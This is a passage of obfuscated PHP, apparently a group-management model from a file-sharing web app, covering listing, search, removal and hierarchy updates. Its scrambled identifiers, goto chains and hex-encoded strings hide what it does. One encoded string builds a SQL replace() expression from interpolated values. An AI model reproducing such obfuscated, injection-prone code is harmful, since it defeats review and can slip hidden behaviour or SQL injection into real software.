$this->cacheFunctionClear($b¥ñÁ‡¿‡[1808], $DÑñÕÈÊÓÈ); $this->cacheFunctionClear($b¥ñÁ‡¿‡[1809], $DÑñÕÈÊÓÈ); } private function _changeChildLevel($EÆÙóíä‡Ò, $c£Ş«ç§ÔÁ, $d¿Ñ§°†¤š = false) { goto EŞç‰œ¾¤Ã; EŞç‰œ¾¤Ã: $cìª‡ºÙÌí =& $_SERVER[Ö‘Øù]; $b«°Ëõ™šò = $EÆÙóíä‡Ò[$cìª‡ºÙÌí[516]] . $EÆÙóíä‡Ò[$cìª‡ºÙÌí[1730]] . $cìª‡ºÙÌí[47]; $EÂº”Ä…ˆÌ = $c£Ş«ç§ÔÁ[$cìª‡ºÙÌí[516]] . $c£Ş«ç§ÔÁ[$cìª‡ºÙÌí[1730]] . $cìª‡ºÙÌí[47] . $EÆÙóíä‡Ò[$cìª‡ºÙÌí[1730]] . $cìª‡ºÙÌí[47]; goto AáŸÃæ‘ç; bç³¤°‘í©: $this->_clearChildrenCache($EÆÙóíä‡Ò); $this->where($c¡Ö­²Ï™Û)->data($CÒ¥¨ğê“ö)->save(); goto F«ê¹×¾î¼; AáŸÃæ‘ç: if ($d¿Ñ§°†¤š) { $EÂº”Ä…ˆÌ = $c£Ş«ç§ÔÁ[$cìª‡ºÙÌí[516]] . $c£Ş«ç§ÔÁ[$cìª‡ºÙÌí[1730]] . $cìª‡ºÙÌí[47]; } $c¡Ö­²Ï™Û = array($cìª‡ºÙÌí[579] => array($cìª‡ºÙÌí[539], $EÆÙóíä‡Ò[$cìª‡ºÙÌí[516]] . $EÆÙóíä‡Ò[$cìª‡ºÙÌí[1730]] . $cìª‡ºÙÌí[540])); $CÒ¥¨ğê“ö = array($cìª‡ºÙÌí[579] => array($cìª‡ºÙÌí[588], "\162\145\160\154\141\143\145\x28\x70\141\x72\145\x6e\x74\114\x65\166\x65\154\x2c\x27{$b«°Ëõ™šò}\x27\54\47{$EÂº”Ä…ˆÌ}\47\51")); goto bç³¤°‘í©; F«ê¹×¾î¼: } public function setNamePinyin($FÇ™æîÃ´å, $c¯ê‘…¨ºĞ = false) { $aˆÁõ³†Åƒ =& $_SERVER[Ö‘Øù]; if (!$c¯ê‘…¨ºĞ) { $AêÂÑõÛ  = $this->getInfoSimple($FÇ™æîÃ´å); $c¯ê‘…¨ºĞ = $AêÂÑõÛ [$aˆÁõ³†Åƒ[28]]; } if (!Input::check($c¯ê‘…¨ºĞ, $aˆÁõ³†Åƒ[582])) { $this->metaSet($FÇ™æîÃ´å, $aˆÁõ³†Åƒ[459], null); $this->metaSet($FÇ™æîÃ´å, $aˆÁõ³†Åƒ[458], null); return; } $E“®ÕŒÜŒ„ = array($aˆÁõ³†Åƒ[459] => str_replace($aˆÁõ³†Åƒ[50], $aˆÁõ³†Åƒ[33], Pinyin::get($c¯ê‘…¨ºĞ)), $aˆÁõ³†Åƒ[458] => Pinyin::get($c¯ê‘…¨ºĞ, $aˆÁõ³†Åƒ[583])); $this->metaSet($FÇ™æîÃ´å, $E“®ÕŒÜŒ„); } protected function groupStatus($d¤å¢½È›İ, $DÙ¨ÇÆğÑ§) { goto f´¡—Ô½ò; CöË…ùÄä©: foreach ($DòÛµÁ™‹ as $d¤å¢½È›İ) { $EäÁ½óÒÛğ[] = array($b¶ÀŠ§¢‡‘[1730] => $d¤å¢½È›İ, $b¶ÀŠ§¢‡‘[93] => $b¶ÀŠ§¢‡‘[743], $b¶ÀŠ§¢‡‘[372] => $DÙ¨ÇÆğÑ§); $this->_clearCache($d¤å¢½È›İ); } return Model($b¶ÀŠ§¢‡‘[1815])->addAll($EäÁ½óÒÛğ, array(), !0); goto F»‚×‰Å³é; f´¡—Ô½ò: $b¶ÀŠ§¢‡‘ =& $_SERVER[Ö‘Øù]; $eÁÒ‰Ó„™‹ = $this->getInfoSimple($d¤å¢½È›İ); if (!$eÁÒ‰Ó„™‹) { return !1; } goto C¹š¸–„ŒŸ; C¹š¸–„ŒŸ: if ($DÙ¨ÇÆğÑ§ == $b¶ÀŠ§¢‡‘[87]) { $DòÛµÁ™‹ = $this->parentLevelArray($eÁÒ‰Ó„™‹[$b¶ÀŠ§¢‡‘[516]]); } else { $Fª–ˆò‰Ç = array($b¶ÀŠ§¢‡‘[579] => array($b¶ÀŠ§¢‡‘[539], $eÁÒ‰Ó„™‹[$b¶ÀŠ§¢‡‘[516]] . $eÁÒ‰Ó„™‹[$b¶ÀŠ§¢‡‘[1730]] . $b¶ÀŠ§¢‡‘[540])); $DòÛµÁ™‹ = $this->where($Fª–ˆò‰Ç)->field($b¶ÀŠ§¢‡‘[1730])->select(); $DòÛµÁ™‹ = array_to_keyvalue($DòÛµÁ™‹, $b¶ÀŠ§¢‡‘[33], $b¶ÀŠ§¢‡‘[1730]); } $DòÛµÁ™‹[] = $eÁÒ‰Ó„™‹[$b¶ÀŠ§¢‡‘[1730]]; $EäÁ½óÒÛğ = array(); goto CöË…ùÄä©; F»‚×‰Å³é: } protected function groupRemove($Eô°•»÷®ç) { goto cÌì’œ²à¦; fÇ¾ÖÔŞÈ: $this->where(array($b‡¬Ÿõ‰øæ[493] => $Eô°•»÷®ç))->save(array($b‡¬Ÿõ‰øæ[493] => $E³‰µÅ›ª[$b‡¬Ÿõ‰øæ[493]])); Model($b‡¬Ÿõ‰øæ[1815])->where($C¸ˆÙ¤ø)->delete(); Model($b‡¬Ÿõ‰øæ[1816])->where($C¸ˆÙ¤ø)->delete(); goto f‹­œÉ¡Ø„; f‹­œÉ¡Ø„: Model($b‡¬Ÿõ‰øæ[825])->groupRootRemove($Eô°•»÷®ç); return $this->where($C¸ˆÙ¤ø)->delete(); goto AÍÊ—Î¢®¥; A½ÕİæÎî¹: if (!$E³‰µÅ›ª || $E³‰µÅ›ª[$b‡¬Ÿõ‰øæ[493]] == 0) { return !1; } $dé»¢Æø‚ = $this->getInfoSimple($E³‰µÅ›ª[$b‡¬Ÿõ‰øæ[493]]); $this->_changeChildLevel($E³‰µÅ›ª, $dé»¢Æø‚, !0); goto fÇ¾ÖÔŞÈ; cÌì’œ²à¦: $b‡¬Ÿõ‰øæ =& $_SERVER[Ö‘Øù]; $C¸ˆÙ¤ø = array($b‡¬Ÿõ‰øæ[1730] => $Eô°•»÷®ç); $E³‰µÅ›ª = $this->where($C¸ˆÙ¤ø)->find(); goto A½ÕİæÎî¹; AÍÊ—Î¢®¥: } protected function groupSort($f•‹ŞÊô©À) { $Eƒöğœ© =& $_SERVER[Ö‘Øù]; $C¶Çö°Ÿ§¦ = array(); foreach ($f•‹ŞÊô©À as $fá¢à¢¸Í® => $Bî—‘ë¿‡) { $C¶Çö°Ÿ§¦[] = array($Eƒöğœ©[1730], $Bî—‘ë¿‡, $Eƒöğœ©[1753], $fá¢à¢¸Í® + 1); } $this->saveAll($C¶Çö°Ÿ§¦); } public function listData() { $A©¨æ’îœ¯ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A©¨æ’îœ¯[$_SERVER[Ö‘Øù][367]]); return $A©¨æ’îœ¯; } private function _makeOrder($C‡ë”Ó­Š÷ = '') { goto e¶ôˆ‚Ä¾; Aôòù§“ïø: $C‡ë”Ó­Š÷ = $C‡ë”Ó­Š÷ . "{$b…¬ÚËÍ÷}\40{$C”Ó¹„Í³}\x2c\40\147\x72\157\x75\160\x49\x44\40\x61\x73\143"; return $this->order($C‡ë”Ó­Š÷); goto BÄòºš¿ñ; e¶ôˆ‚Ä¾: $dô­Ü–Òë’ =& $_SERVER[Ö‘Øù]; $C¤Ä¿ŒëÍÈ = array($dô­Ü–Òë’[1730], $dô­Ü–Òë’[28], $dô­Ü–Òë’[1716], $dô­Ü–Òë’[194]); $AŞ•ãĞ ‡ = array($dô­Ü–Òë’[443] => $dô­Ü–Òë’[444], $dô­Ü–Òë’[445] => $dô­Ü–Òë’[446]); goto EÓœ­Åİóó; EÓœ­Åİóó: $b…¬ÚËÍ÷ = Input::get($dô­Ü–Òë’[450], $dô­Ü–Òë’[7], $dô­Ü–Òë’[1734], $C¤Ä¿ŒëÍÈ); $C”Ó¹„Í³ = Input::get($dô­Ü–Òë’[451], $dô­Ü–Òë’[7], $dô­Ü–Òë’[1817], array($dô­Ü–Òë’[1817], $dô­Ü–Òë’[445])); $C”Ó¹„Í³ = $AŞ•ãĞ ‡[$C”Ó¹„Í³]; goto Aôòù§“ïø; BÄòºš¿ñ: } public function listChild($fåàŞ´³™†) { $AîˆÜ¯ÃÌ =& $_SERVER[Ö‘Øù]; $b¹‚¨¶Ø™å = $this->where(array($AîˆÜ¯ÃÌ[493] => $fåàŞ´³™†))->_makeOrder()->selectPage(200); $this->_listDataApply($b¹‚¨¶Ø™å[$AîˆÜ¯ÃÌ[367]]); return $b¹‚¨¶Ø™å; } public function listByID($EƒğóÓÛƒ´) { goto CÕöéó‚ø; D˜é‚È¦çÈ: $A½‰„«ªò¬ = $this->where($C¯«‡„ìèœ)->select(); $A½‰„«ªò¬ = array_sort_keep($A½‰„«ªò¬, $FÇĞÔ°œãÜ[1730], $EƒğóÓÛƒ´); $this->_listDataApply($A½‰„«ªò¬); goto a•ö¦¨ÁŒÒ; CÕöéó‚ø: $FÇĞÔ°œãÜ =& $_SERVER[Ö‘Øù]; if (!$EƒğóÓÛƒ´) { return array(); } $C¯«‡„ìèœ = array($FÇĞÔ°œãÜ[1730] => array($FÇĞÔ°œãÜ[7], $EƒğóÓÛƒ´)); goto D˜é‚È¦çÈ; a•ö¦¨ÁŒÒ: return $A½‰„«ªò¬; goto bŒšğŸÑÂ; bŒšğŸÑÂ: } public function listSearch($A³µÏö®») { goto A¢«ÇØ¶; b±ƒ’–êƒã: if ($F¹¢¥²ê‚œ) { $fÍÑÍ¾¬‡Ö = $this->getInfoSimple($F¹¢¥²ê‚œ); $b§ÙÛëî­ç = $fÍÑÍ¾¬‡Ö[$b«ïŸßí¿•[516]] . $F¹¢¥²ê‚œ . $b«ïŸßí¿•[540]; $f¾¾÷“„¼ = array($f¾¾÷“„¼, array($b«ïŸßí¿•[516] => array($b«ïŸßí¿•[381], $b§ÙÛëî­ç))); } $f¾¾÷“„¼ = $this->parseWhereLike($f¾¾÷“„¼); $Cß½ë°É Ü = $this->_makeOrder()->where($f¾¾÷“„¼)->selectPage(20); goto E´ˆÂ÷‡ªŸ; fÀ‡Ê•§ì…: return $Cß½ë°É Ü; goto cçŒá¡â¨Ú; E´ˆÂ÷‡ªŸ: $Cß½ë°É Ü = $Cß½ë°É Ü ? $Cß½ë°É Ü : array($b«ïŸßí¿•[367] => array(), $b«ïŸßí¿•[364] => array()); if (!$Cß½ë°É Ü || count($Cß½ë°É Ü[$b«ïŸßí¿•[367]]) < 5 && Input::check($cÈ¯å‹Àµå, $b«ïŸßí¿•[316])) { goto AÇ¯±’øö±; c™ˆÂÊ“ˆß: $a…˜½ƒˆå = array_merge($B¥ä•Åã, $Bèååî‰í†, $Cß½ë°É Ü[$b«ïŸßí¿•[367]]); $Cß½ë°É Ü[$b«ïŸßí¿•[367]] = array_unique_by_key($a…˜½ƒˆå, $b«ïŸßí¿•[1730]); $Cß½ë°É Ü[$b«ïŸßí¿•[364]][$b«ïŸßí¿•[365]] = count($Cß½ë°É Ü[$b«ïŸßí¿•[367]]); goto C§•œé§Ê; AÇ¯±’øö±: $f¿ÃëƒÓ†§ = $this->groupChildrenAll($F¹¢¥²ê‚œ); $B¥ä•Åã = $this->_searchFromMeta($b«ïŸßí¿•[458], $cÈ¯å‹Àµå, 10, $f¿ÃëƒÓ†§); $Bèååî‰í† = $this->_searchFromMeta($b«ïŸßí¿•[459], $cÈ¯å‹Àµå, 10, $f¿ÃëƒÓ†§); goto c™ˆÂÊ“ˆß; C§•œé§Ê: $Cß½ë°É Ü[$b«ïŸßí¿•[364]][$b«ïŸßí¿•[366]] = ceil($Cß½ë°É Ü[$b«ïŸßí¿•[364]][$b«ïŸßí¿•[365]] / $Cß½ë°É Ü[$b«ïŸßí¿•[364]][$b«ïŸßí¿•[361]]); goto d„¿ƒÒµß; d„¿ƒÒµß: } $this->_listDataApply($Cß½ë°É Ü[$b«ïŸßí¿•[367]]); goto fÀ‡Ê•§ì…; A¢«ÇØ¶: $b«ïŸßí¿• =& $_SERVER[Ö‘Øù]; $cÈ¯å‹Àµå = $A³µÏö®»[$b«ïŸßí¿•[1818]]; $F¹¢¥²ê‚œ = isset($A³µÏö®»[$b«ïŸßí¿•[1819]]) ? $A³µÏö®»[$b«ïŸßí¿•[1819]] : !1; goto eï™»˜´; eï™»˜´: if (!trim($cÈ¯å‹Àµå)) { return !1; } $cÈ¯å‹Àµå = str_replace($b«ïŸßí¿•[1820], $b«ïŸßí¿•[1821], $cÈ¯å‹Àµå); $f¾¾÷“„¼ = array($b«ïŸßí¿•[1730] => array($b«ïŸßí¿•[381], "{$cÈ¯å‹Àµå}\x25"), $b«ïŸßí¿•[28] => array($b«ïŸßí¿•[381], "\x25{$cÈ¯å‹Àµå}\45"), $b«ïŸßí¿•[993] => $b«ïŸßí¿•[1822]); goto b±ƒ’–êƒã; cçŒá¡â¨Ú: } protected function groupChildrenAll($DĞˆÌñ“›²) { $cŒˆåî´³ =& $_SERVER[Ö‘Øù]; if (!$DĞˆÌñ“›²) { return !1; } if (is_string($DĞˆÌñ“›²)) { $DĞˆÌñ“›² = array($DĞˆÌñ“›²); } $aø¦£ê·×Ø = $DĞˆÌñ“›²; foreach ($DĞˆÌñ“›² as $eà×–¬š¼) { $AÏ¶«à¿Îê = $this->getInfoSimple($eà×–¬š¼); $Fº’ùîÀÏ‹ = array($cŒˆåî´³[516] => array($cŒˆåî´³[381], $AÏ¶«à¿Îê[$cŒˆåî´³[516]] . $eà×–¬š¼ . $cŒˆåî´³[540])); $d»ÂêœÌæ = $this->field($cŒˆåî´³[1730])->where($Fº’ùîÀÏ‹)->select(); $aø¦£ê·×Ø = array_merge($aø¦£ê·×Ø, array_to_keyvalue($d»ÂêœÌæ, $cŒˆåî´³[33], $cŒˆåî´³[1730])); } return array_unique($aø¦£ê·×Ø); } private function _searchFromMeta($ağ„åƒğáÜ, $aÃÊøÃĞÆ, $B®Ã¬¢ˆ‰, $eöé«‹®Â) { goto EÈåš´ÎáÈ; B„ ½È­´Á: $dù¬áåÃ•Ü = $this->parseWhereLike($dù¬áåÃ•Ü); if ($eöé«‹®Â) { $dù¬áåÃ•Ü[$FÆğŒ‡”ÍŠ[1730]] = array($FÆğŒ‡”ÍŠ[7], $eöé«‹®Â); } $a«óç±¡§â = Model($FÆğŒ‡”ÍŠ[1823])->where($dù¬áåÃ•Ü)->limit($B®Ã¬¢ˆ‰)->select(); goto aîÜİÇ§«Ë; f†‹ÎÎ®ç: if (!$c‰‹Ôœ“´) { return array(); } return $c‰‹Ôœ“´; goto b‘ÁÀ Â‰; EÈåš´ÎáÈ: $FÆğŒ‡”ÍŠ =& $_SERVER[Ö‘Øù]; $aÃÊøÃĞÆ = strtolower($aÃÊøÃĞÆ); $dù¬áåÃ•Ü = array($FÆğŒ‡”ÍŠ[93] => $ağ„åƒğáÜ, $FÆğŒ‡”ÍŠ[372] => array($FÆğŒ‡”ÍŠ[381], "\45{$aÃÊøÃĞÆ}\x25")); goto B„ ½È­´Á; aîÜİÇ§«Ë: if (!$a«óç±¡§â) { return array(); } $a«óç±¡§â = array_to_keyvalue($a«óç±¡§â, $FÆğŒ‡”ÍŠ[33], $FÆğŒ‡”ÍŠ[1730]); $c‰‹Ôœ“´ = $this->where(array($FÆğŒ‡”ÍŠ[1814] => array($FÆğŒ‡”ÍŠ[7], $a«óç±¡§â)))->select(); goto f†‹ÎÎ®ç; b‘ÁÀ Â‰: } protected function _listDataApplyItem($eï¶İƒõâˆ) { $C‘µÚÇÕ‹Ÿ = array($eï¶İƒõâˆ); $this->_listDataApply($C‘µÚÇÕ‹Ÿ); return $C‘µÚÇÕ‹Ÿ[0]; } protected function _listDataApply(&$bğºË÷¦è˜) { goto cç¹Áç–óô; d¨‰˜¤à: $this->_listAppendParent($bğºË÷¦è˜); $this->_listAppendSourceRoot($bğºË÷¦è˜, $C”á¡¼ö); goto E¯ˆƒ‚Ğ÷; cç¹Áç–óô: $d—­âÊİÜ¥ =& $_SERVER[Ö‘Øù]; if (!$bğºË÷¦è˜) { return; } $C”á¡¼ö = array_to_keyvalue($bğºË÷¦è˜, $d—­âÊİÜ¥[33], $d—­âÊİÜ¥[1730]); goto BíÀ¦ßƒÓ˜; BíÀ¦ßƒÓ˜: $this->_listAppendChildren($bğºË÷¦è˜); $this->_listAppendChildrenMember($bğºË÷¦è˜); $this->_listAppendMeta($bğºË÷¦è˜, $C”á¡¼ö); goto d¨‰˜¤à; E¯ˆƒ‚Ğ÷: } private function _listAppendChildren(&$e”¹„ö©­) { goto cğêï®“ïğ; CØÑù‰ ¡: foreach ($e”¹„ö©­ as &$cñèõŸ¬·ä) { $b–ÕùÏÊ¸ = $cñèõŸ¬·ä[$b…¡é“Øã‰[1730]]; $cñèõŸ¬·ä[$b…¡é“Øã‰[1825]] = isset($dáî×í÷šŸ[$b–ÕùÏÊ¸]) ? intval($dáî×í÷šŸ[$b–ÕùÏÊ¸]) : !1; } unset($cñèõŸ¬·ä); goto e¿Ô‡ÛŒ…; fÖŒ˜Ô: $F™˜¹ç…ÓŒ = array($b…¡é“Øã‰[493], $b…¡é“Øã‰[1824] => $b…¡é“Øã‰[495]); $AÌ‰©æê½” = $this->field($F™˜¹ç…ÓŒ)->where($eƒšÑçÈ´é)->group($b…¡é“Øã‰[493])->select(); $dáî×í÷šŸ = array_to_keyvalue($AÌ‰©æê½”, $b…¡é“Øã‰[493], $b…¡é“Øã‰[495]); goto CØÑù‰ ¡; cğêï®“ïğ: $b…¡é“Øã‰ =& $_SERVER[Ö‘Øù]; $c’‘¡Ñ‰•Å = array_to_keyvalue($e”¹„ö©­, $b…¡é“Øã‰[33], $b…¡é“Øã‰[1730]); $eƒšÑçÈ´é = array($b…¡é“Øã‰[493] => array($b…¡é“Øã‰[7], $c’‘¡Ñ‰•Å)); goto fÖŒ˜Ô; e¿Ô‡ÛŒ…: } private function _listAppendChildrenMember(&$E¼ÆŠßÏò) { goto bÂĞ¢¨³‹; DÃ¨ÁÓ¼’¿: $fÑŞˆìÓäí = array($bÉÒÇùíæ[1730], $bÉÒÇùíæ[1824] => $bÉÒÇùíæ[495]); $E†¸Å®öá² = Model($bÉÒÇùíæ[1816])->field($fÑŞˆìÓäí)->where($c§‹™˜‹¾Š)->group($bÉÒÇùíæ[1730])->select(); $dšè”Õáà„ = array_to_keyvalue($E†¸Å®öá², $bÉÒÇùíæ[1730], $bÉÒÇùíæ[495]); goto cí¸„Ûá¯; bÂĞ¢¨³‹: $bÉÒÇùíæ =& $_SERVER[Ö‘Øù]; $eÅ¸„Ğè = array_to_keyvalue($E¼ÆŠßÏò, $bÉÒÇùíæ[33], $bÉÒÇùíæ[1730]); $c§‹™˜‹¾Š = array($bÉÒÇùíæ[1730] => array($bÉÒÇùíæ[7], $eÅ¸„Ğè)); goto DÃ¨ÁÓ¼’¿; cí¸„Ûá¯: foreach ($E¼ÆŠßÏò as &$açó³¦±”) { $fí—ÖÚÔ = $açó³¦±”[$bÉÒÇùíæ[1730]]; $açó³¦±”[$bÉÒÇùíæ[1826]] = isset($dšè”Õáà„[$fí—ÖÚÔ]) ? intval($dšè”Õáà„[$fí—ÖÚÔ]) : !1; } unset($açó³¦±”); goto AôŒàê¦ÆÒ; AôŒàê¦ÆÒ: } private function _listAppendMeta(&$cÔÎµŒòÔ„, $eîº‡‰ò´á) { goto A°Øàˆ—¯Á; A°Øàˆ—¯Á: $e·«Š‡¥Éñ =& $_SERVER[Ö‘Øù]; $AªƒÓ­ŒÁ‡ = array($e·«Š‡¥Éñ[1730] => array($e·«Š‡¥Éñ[7], $eîº‡‰ò´á)); $e¦´›†àƒø = Model($e·«Š‡¥Éñ[1815])->where($AªƒÓ­ŒÁ‡)->select(); goto cù»ßÊŞ”•; Fôô±ÎÕ¨”: foreach ($cÔÎµŒòÔ„ as &$f­“®Õ‘) { $f­“®Õ‘[$e·«Š‡¥Éñ[460]] = array(); if (isset($e¦´›†àƒø[$f­“®Õ‘[$e·«Š‡¥Éñ[1730]]])) { $f­“®Õ‘[$e·«Š‡¥Éñ[460]] = $e¦´›†àƒø[$f­“®Õ‘[$e·«Š‡¥Éñ[1730]]]; } } unset($f­“®Õ‘); goto bõ¨Óƒ’½ğ; cù»ßÊŞ”•: $e¦´›†àƒø = array_to_keyvalue_group($e¦´›†àƒø, $e·«Š‡¥Éñ[1730]); foreach ($e¦´›†àƒø as &$eÔ»¤¸  ¸) { $eÔ»¤¸  ¸ = array_to_keyvalue($eÔ»¤¸  ¸, $e·«Š‡¥Éñ[93], $e·«Š‡¥Éñ[372]); } unset($eÔ»¤¸  ¸); goto Fôô±ÎÕ¨”; bõ¨Óƒ’½ğ: } protected function parentLevelArray($FÛ—ÖÅÖÑ) { $D™ßº…ÓÛ³ =& $_SERVER[Ö‘Øù]; $FÛ—ÖÅÖÑ = explode($D™ßº…ÓÛ³[47], trim($FÛ—ÖÅÖÑ, $D™ßº…ÓÛ³[47])); $FÛ—ÖÅÖÑ = array_remove_value($FÛ—ÖÅÖÑ, $D™ßº…ÓÛ³[191]); return $FÛ—ÖÅÖÑ; } private function _listAppendParent(&$c†¡¬á…–’) { goto B×‡ğ•‡ó; e‡èö›Ÿø‘: if ($GLOBALS[$fĞÀŒ°ŒÑÁ[500]] == $fĞÀŒ°ŒÑÁ[87]) { $E¤Ä©ñ¶ = !1; } foreach ($c†¡¬á…–’ as &$A³‹Ø²ÆªÁ) { $bò­ÙŠ‹İ = $this->parentLevelArray($A³‹Ø²ÆªÁ[$fĞÀŒ°ŒÑÁ[516]]); $c˜áíÑÛÄ° = $fĞÀŒ°ŒÑÁ[33]; foreach ($bò­ÙŠ‹İ as $BÂ¾½ç—ğÄ => $dä¶ˆÆµ) { if ($E¤Ä©ñ¶ && $BÂ¾½ç—ğÄ == 0) { continue; } $c˜áíÑÛÄ° .= $Dø›“´†‰[$dä¶ˆÆµ] . $fĞÀŒ°ŒÑÁ[8]; } if ($bò­ÙŠ‹İ) { $c˜áíÑÛÄ° .= $A³‹Ø²ÆªÁ[$fĞÀŒ°ŒÑÁ[28]]; } $A³‹Ø²ÆªÁ[$fĞÀŒ°ŒÑÁ[521]] = str_replace($fĞÀŒ°ŒÑÁ[524], $fĞÀŒ°ŒÑÁ[8], $c˜áíÑÛÄ°); } unset($A³‹Ø²ÆªÁ); goto B‘İí²ª§; CÖˆ¬ ¢ˆ: unset($A³‹Ø²ÆªÁ); foreach ($Dø›“´†‰ as $BÂ¾½ç—ğÄ => $aç¥‚„Á‡¥) { if ($aç¥‚„Á‡¥) { continue; } $aë¯Œ¾ù¹ = $this->getInfoSimple($BÂ¾½ç—ğÄ); $Dø›“´†‰[$BÂ¾½ç—ğÄ] = $aë¯Œ¾ù¹[$fĞÀŒ°ŒÑÁ[28]]; } $E¤Ä©ñ¶ = $GLOBALS[$fĞÀŒ°ŒÑÁ[6]][$fĞÀŒ°ŒÑÁ[88]][$fĞÀŒ°ŒÑÁ[1827]]; goto e‡èö›Ÿø‘; B×‡ğ•‡ó: $fĞÀŒ°ŒÑÁ =& $_SERVER[Ö‘Øù]; $Dø›“´†‰ = array(); foreach ($c†¡¬á…–’ as &$A³‹Ø²ÆªÁ) { $Dø›“´†‰[$A³‹Ø²ÆªÁ[$fĞÀŒ°ŒÑÁ[1730]]] = $A³‹Ø²ÆªÁ[$fĞÀŒ°ŒÑÁ[28]]; $bò­ÙŠ‹İ = $this->parentLevelArray($A³‹Ø²ÆªÁ[$fĞÀŒ°ŒÑÁ[516]]); foreach ($bò­ÙŠ‹İ as $dä¶ˆÆµ) { if (!isset($Dø›“´†‰[$dä¶ˆÆµ])) { $Dø›“´†‰[$dä¶ˆÆµ] = 0; } } } goto CÖˆ¬ ¢ˆ; B‘İí²ª§: } private function _listAppendSourceRoot(&$BÙ§“•£„¡, $bîÉ¨ÎáÖœ) { goto cº­ÈÍî×‚; cº­ÈÍî×‚: $FÀÒ®¼Ö×† =& $_SERVER[Ö‘Øù]; $dÏ¯—¸š÷Æ = array($FÀÒ®¼Ö×†[493] => 0, $FÀÒ®¼Ö×†[499] => array($FÀÒ®¼Ö×†[7], $bîÉ¨ÎáÖœ), $FÀÒ®¼Ö×†[406] => SourceModel::TYPE_GROUP); $b‹Ùéïå²Ò = Model($FÀÒ®¼Ö×†[825])->order($FÀÒ®¼Ö×†[1828])->field($FÀÒ®¼Ö×†[1829]); goto CåÇ’÷š´; CåÇ’÷š´: $eÆœÊÂ¼– = $b‹Ùéïå²Ò->limit(count($bîÉ¨ÎáÖœ))->where($dÏ¯—¸š÷Æ)->select(); $eÆœÊÂ¼– = array_to_keyvalue($eÆœÊÂ¼–, $FÀÒ®¼Ö×†[499]); $eÆœÊÂ¼– = array_remove_key($eÆœÊÂ¼–, $FÀÒ®¼Ö×†[499]); goto a†ÑçİËƒÒ; a†ÑçİËƒÒ: foreach ($BÙ§“•£„¡ as &$AÙ£Ø²Óº‚) { $AÙ£Ø²Óº‚[$FÀÒ®¼Ö×†[85]] = $eÆœÊÂ¼–[$AÙ£Ø²Óº‚[$FÀÒ®¼Ö×†[1730]]] ? $eÆœÊÂ¼–[$AÙ£Ø²Óº‚[$FÀÒ®¼Ö×†[1730]]] : array(); } unset($AÙ£Ø²Óº‚); goto Fâ‡ù†Â¾Š; Fâ‡ù†Â¾Š: } protected function groupMerge($EÃÉç´È¤é) { $EÃÉç´È¤é = array_values(array_unique($EÃÉç´È¤é)); $Cˆİ†ĞÇâÇ = array(); for ($E‡¸òšñº‹ = 0; $E‡¸òšñº‹ < count($EÃÉç´È¤é); $E‡¸òšñº‹++) { $c‰ö¡ƒ»ñ½ = !1; for ($e”¬ùâÔØ† = 0; $e”¬ùâÔØ† < count($EÃÉç´È¤é); $e”¬ùâÔØ†++) { if ($E‡¸òšñº‹ == $e”¬ùâÔØ†) { continue; } if ($this->isParentOf($EÃÉç´È¤é[$e”¬ùâÔØ†], $EÃÉç´È¤é[$E‡¸òšñº‹])) { $c‰ö¡ƒ»ñ½ = !0; break; } } if (!$c‰ö¡ƒ»ñ½) { $Cˆİ†ĞÇâÇ[] = $EÃÉç´È¤é[$E‡¸òšñº‹]; } } return $Cˆİ†ĞÇâÇ; } protected function isParentOf($dØã¢Ù¶íÚ, $dµ¨„Â­) { goto cÚàÓ¬å½­; eÜÜ§‘ˆŞ: $Cñ°š³¥°ù = $this->getInfoSimple($dµ¨„Â­); $dÛÕ…†´ô = $E¬­¹óÒ°İ[$d©ˆä¶Ù÷ò[516]] . $dØã¢Ù¶íÚ . $d©ˆä¶Ù÷ò[47]; if (substr($Cñ°š³¥°ù[$d©ˆä¶Ù÷ò[516]], 0, strlen($dÛÕ…†´ô)) == $dÛÕ…†´ô) { return !0; } goto FÔ“”Îƒé; FÔ“”Îƒé: return !1; goto dÓš¼»ÚÅ; cÚàÓ¬å½­: $d©ˆä¶Ù÷ò =& $_SERVER[Ö‘Øù]; if (!$dØã¢Ù¶íÚ || !$dµ¨„Â­ || $dØã¢Ù¶íÚ == $dµ¨„Â­) { return !1; } $E¬­¹óÒ°İ = $this->getInfoSimple($dØã¢Ù¶íÚ); goto eÜÜ§‘ˆŞ; dÓš¼»ÚÅ: } public function groupShowRoot($E•„°«¡Ì, $A‰ë†ò‰…‚ = false) { goto aÌÚœÔß¶; EÆÃ»Ãöî: $C¥Ã–¶¯¤ö = $this->parentLevelArray($D¹Ì¬í‹Û[$D•¶ÚÚ–»æ[516]]); $A­É²ù‹Ÿø = array($E•„°«¡Ì); if (count($C¥Ã–¶¯¤ö) == 0) { return $A­É²ù‹Ÿø; } goto B·¿Œ¡£—–; B·¿Œ¡£—–: if ($A‰ë†ò‰…‚ && count($C¥Ã–¶¯¤ö) == 1) { return $A­É²ù‹Ÿø; } if (!$D¹Ì¬í‹Û[$D•¶ÚÚ–»æ[460]] || !isset($D¹Ì¬í‹Û[$D•¶ÚÚ–»æ[460]][$D•¶ÚÚ–»æ[1812]]) || $D¹Ì¬í‹Û[$D•¶ÚÚ–»æ[460]][$D•¶ÚÚ–»æ[1812]] == $D•¶ÚÚ–»æ[1784]) { return $this->groupShowRoot($C¥Ã–¶¯¤ö[count($C¥Ã–¶¯¤ö) - 1], $A‰ë†ò‰…‚); } if ($D¹Ì¬í‹Û[$D•¶ÚÚ–»æ[460]][$D•¶ÚÚ–»æ[1812]] == $D•¶ÚÚ–»æ[355]) { $fß¤­ÙˆĞ¬ = explode($D•¶ÚÚ–»æ[47], $D¹Ì¬í‹Û[$D•¶ÚÚ–»æ[460]][$D•¶ÚÚ–»æ[1813]]); if ($fß¤­ÙˆĞ¬) { $A­É²ù‹Ÿø = array_merge($A­É²ù‹Ÿø, $fß¤­ÙˆĞ¬); } } goto CáĞ©Èõ³ô; CáĞ©Èõ³ô: return $A­É²ù‹Ÿø; goto f¸³ÒŞ‘ìİ; aÌÚœÔß¶: $D•¶ÚÚ–»æ =& $_SERVER[Ö‘Øù]; $D¹Ì¬í‹Û = $this->getInfo($E•„°«¡Ì); if (!$D¹Ì¬í‹Û) { return array(); } goto EÆÃ»Ãöî; f¸³ÒŞ‘ìİ: } protected function resetParentLevel() { $d‹±Ğ‹¦³ =& $_SERVER[Ö‘Øù]; $cÓ˜±Í„„ó = $d‹±Ğ‹¦³[1730]; $a„‚§„±·Ç = $this->select(); $a„‚§„±·Ç = array_to_keyvalue($a„‚§„±·Ç, $cÓ˜±Í„„ó); foreach ($a„‚§„±·Ç as $bñèÜªš†ù) { goto eéœ‰˜ÁÒ; bÌö¸©Ê„ì: 